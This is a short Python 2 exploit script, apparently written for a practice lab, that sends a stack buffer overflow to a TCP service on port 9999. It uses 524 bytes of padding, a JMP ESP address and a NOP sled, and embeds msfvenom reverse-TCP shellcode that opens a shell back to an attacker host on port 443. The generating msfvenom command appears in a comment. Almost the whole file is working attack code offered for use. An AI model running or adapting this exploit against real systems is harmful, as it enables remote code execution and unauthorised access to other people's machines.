#!/usr/bin/python

import socket 
import sys

host='192.168.187.128'
port=9999

if len(sys.argv) == 3:
    # sys.argv[0] <= python
    host=sys.argv[1]
    port=int(sys.argv[2])

# locate the pattern_create
# msfvenom -l payloads
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.187.134 LPORT=443 -f python -e
# x86/shikata_ga_nai -b "\x00\x0a\x0d"

shellCode =  ""
shellCode += "\xba\xdc\x61\x97\xad\xdb\xdc\xd9\x74\x24\xf4\x5e\x29"
shellCode += "\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\x8a\x6f\x75"
shellCode += "\x58\x03\xab\x8e\x40\x30\x08\x22\xed\xb4\x07\x25\x41"
shellCode += "\xde\xda\x26\x31\x47\x55\x19\xfb\xf7\xdc\x1f\xfa\x9f"
shellCode += "\x1e\x77\x47\xd9\xf7\x8a\xb8\xe4\xbc\x02\x59\x56\xa4"
shellCode += "\x44\xcb\xc5\x9a\x66\x62\x08\x11\xe8\x26\xa2\xc4\xc6"
shellCode += "\xb5\x5a\x71\x36\x15\xf8\xe8\xc1\x8a\xae\xb9\x58\xad"
shellCode += "\xfe\x35\x96\xae"

EIP = 'A'*524
ESP = '\xf3\x12\x17\x31' #JMP ESP address
padding = '\x90' *16

payloadString=EIP + ESP +padding + shellCode + padding 

print "\n Attacker Start! "
print "Host: {} {}".format(host,port)
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "Fuzzing with %s bytes" % len(payloadString)
    connect = serverSocket.connect((host,port))
    data = serverSocket.recv(1024)
    serverSocket.send(payloadString)
    print "\n completed"
except socket.error as e:
    print "\error"+str(e)
finally:
    serverSocket.close
